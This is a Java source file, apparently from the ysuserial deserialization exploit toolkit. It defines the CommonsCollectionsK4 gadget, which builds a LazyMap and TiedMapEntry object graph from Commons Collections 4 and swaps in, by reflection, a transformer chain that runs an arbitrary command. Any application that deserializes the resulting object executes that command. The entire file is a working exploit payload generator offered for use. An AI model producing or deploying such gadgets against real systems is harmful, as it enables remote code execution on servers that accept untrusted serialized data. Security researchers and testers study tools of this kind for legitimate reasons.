package org.su18.ysuserial.payloads.gadgets;

import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.PayloadRunner;
import org.su18.ysuserial.payloads.util.Reflections;
import org.su18.ysuserial.payloads.util.Transformer4Util;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

@Dependencies({"commons-collections:commons-collections:4.0"})
@Authors({Authors.MATTHIASKAISER})
public class CommonsCollectionsK4 implements ObjectPayload<Object> {
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollectionsK4.class, args);
    }

    public Object getObject(String command) throws Exception {
        final Transformer[]       fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
        final Transformer[] transformers      = Transformer4Util.makeTransformer(command);
        Transformer         transformerChain = new ChainedTransformer(fakeTransformers);
        Map                 innerMap         = new HashMap();
        Map                 outerMap         = LazyMap.lazyMap(innerMap, transformerChain);
        TiedMapEntry        tme              = new TiedMapEntry(outerMap, "QI4L");
        Map                 expMap           = new HashMap();
        expMap.put(tme, "QI4L");
        outerMap.remove("QI4L");

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
        return expMap;
    }
}
